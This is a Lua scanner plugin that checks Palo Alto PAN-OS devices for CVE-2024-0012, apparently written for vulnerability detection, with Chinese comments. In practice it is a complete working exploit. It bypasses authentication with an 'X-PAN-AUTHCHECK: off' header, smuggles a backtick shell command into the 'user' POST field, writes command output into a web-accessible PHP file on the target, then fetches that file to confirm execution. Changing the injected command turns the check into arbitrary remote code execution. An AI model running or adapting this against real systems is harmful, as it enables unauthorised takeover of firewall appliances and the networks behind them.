description = [[
Palo Alto Networks PAN-OS Remote Code Execution (CVE-2024-0012)
]]

-- 跨平台的延时函数
local function sleep(n)
    if os.execute("ping -n " .. tonumber(n+1) .. " localhost > NUL 2>&1") ~= 0 then
        -- 如果 Windows 的 ping 命令失败，尝试 Unix 的 sleep
        os.execute("sleep " .. tonumber(n))
    end
end

-- 从响应中提取 PHPSESSID
local function extract_phpsessid(body)
    local pattern = "@start@PHPSESSID=([^@]+)@end@"
    return string.match(body or "", pattern)
end

function check_CVE_2024_0012(target)
    print("[PaloAlto] Starting CVE-2024-0012 check for", target)
    
    -- 生成随机用户名
    local username = string.format("%x", os.time())
    print("[PaloAlto] Generated username:", username)
    
    -- 构造第一个请求
    local payload = string.format(
        "user=`echo $(ifconfig) > /var/appweb/htdocs/unauth/%s.php`&userRole=superuser&remoteHost=&vsys=vsys1",
        username
    )
    
    local base_headers = {
        ["Host"] = target:match("https?://([^:/]+)"),
        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        ["X-PAN-AUTHCHECK"] = "off",
        ["Accept"] = "*/*",
        ["Accept-Language"] = "en-US,en;q=0.9",
        ["Connection"] = "keep-alive"
    }
    
    local post_headers = {
        ["Host"] = base_headers["Host"],
        ["Content-Type"] = "application/x-www-form-urlencoded",
        ["User-Agent"] = base_headers["User-Agent"],
        ["X-PAN-AUTHCHECK"] = "off"
    }
    
    print("[PaloAlto] Sending initial POST request with headers:", post_headers)
    
    -- 发送第一个请求
    local resp = http.post(target .. "/php/utils/createRemoteAppwebSession.php/rce.js.map", {
        headers = post_headers,
        data = payload,
        timeout = 10,
        allow_redirects = false
    })
    
    if not resp then
        print("[PaloAlto] No response received from initial request")
        return nil
    end
    
    print("[PaloAlto] Initial response status:", resp.status)
    print("[PaloAlto] Initial response headers:", resp.headers)
    print("[PaloAlto] Initial response body:", string.sub(resp.body or "", 1, 200))
    
    -- 提取 PHPSESSID
    local phpsessid = extract_phpsessid(resp.body)
    if not phpsessid then
        print("[PaloAlto] Failed to extract PHPSESSID")
        return nil
    end
    print("[PaloAlto] Found PHPSESSID:", phpsessid)
    
    -- 设置带 Cookie 的请求头
    local cookie_headers = {
        ["Host"] = base_headers["Host"],
        ["User-Agent"] = base_headers["User-Agent"],
        ["X-PAN-AUTHCHECK"] = "off",
        ["Cookie"] = "PHPSESSID=" .. phpsessid,
        ["Connection"] = "keep-alive",
        ["Accept"] = base_headers["Accept"],
        ["Accept-Language"] = base_headers["Accept-Language"],
        ["Cache-Control"] = "no-cache"
    }
    
    -- 发送第二个请求 (index.php/.js.map)
    print("[PaloAlto] Sending second request to /index.php/.js.map with headers:", cookie_headers)
    local second_resp = http.get(target .. "/index.php/.js.map", {
        headers = cookie_headers,
        timeout = 10,
        allow_redirects = false
    })
    
    if not second_resp then
        print("[PaloAlto] Failed to send second request")
        return nil
    end
    print("[PaloAlto] Second request status:", second_resp.status)
    print("[PaloAlto] Second response headers:", second_resp.headers)
    print("[PaloAlto] Second response body:", string.sub(second_resp.body or "", 1, 200))
    
    -- 等待文件生成
    sleep(2)
    
    -- 发送第三个请求检查结果
    print("[PaloAlto] Checking for command execution result")
    local check_resp = http.get(target .. "/unauth/" .. username .. ".php", {
        headers = cookie_headers,
        timeout = 10,
        allow_redirects = false
    })
    
    if check_resp then
        print("[PaloAlto] Check response status:", check_resp.status)
        print("[PaloAlto] Check response headers:", check_resp.headers)
        print("[PaloAlto] Response body:", string.sub(check_resp.body or "", 1, 200))
        
        if check_resp.status == 200 and string.match(check_resp.body or "", "eth0:") then
            print("[PaloAlto] RCE vulnerability confirmed!")
            return {
                CVEID = "CVE-2024-0012",
                Severity = "critical",
                Type = "rce",
                Extra = {
                    ["Description"] = "Palo Alto Networks PAN-OS Remote Code Execution Vulnerability",
                    ["Proof"] = string.sub(check_resp.body or "", 1, 200)
                }
            }
        end
    else
        print("[PaloAlto] Failed to check command execution result")
    end
    
    return nil
end

function Analyze(info)
    if not info or not info.IP or not info.Port then
        print("[PaloAlto] Invalid ServiceInfo: missing IP or Port")
        return info
    end

    print("[PaloAlto] Starting analysis for", info.IP..":", info.Port)
    
    -- 构造目标URL
    local target = string.format("http://%s:%d", info.IP, info.Port)
    if info.Port == 443 then
        target = string.format("https://%s:%d", info.IP, info.Port)
    end
    print("[PaloAlto] Target URL:", target)
    
    -- 检查各个CVE
    local vulns = {}
    
    -- 检查 CVE-2024-0012
    local result = check_CVE_2024_0012(target)
    if result then
        table.insert(vulns, result)
        print("[PaloAlto] Added vulnerability:", result.CVEID)
    end
    
    -- 如果发现漏洞，添加到结果中
    if #vulns > 0 then
        info.Vulnerabilities = vulns
        print("[PaloAlto] Total vulnerabilities found:", #vulns)
    else
        print("[PaloAlto] No vulnerabilities found")
    end

    return info
end 